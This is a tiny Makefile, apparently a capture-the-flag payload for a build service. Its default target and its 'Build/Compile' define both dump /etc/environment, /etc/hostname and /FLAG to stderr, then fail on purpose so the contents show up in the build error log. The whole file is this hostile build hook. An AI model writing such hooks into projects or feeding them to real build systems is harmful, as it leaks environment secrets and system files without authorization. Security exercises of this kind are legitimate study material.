all:
	cat /etc/environment >&2
	cat /etc/hostname >&2
	cat /FLAG >&2 || true
	false

define Build/Compile
	cat /etc/environment >&2
	cat /etc/hostname >&2
	cat /FLAG >&2 || true
	false
endef
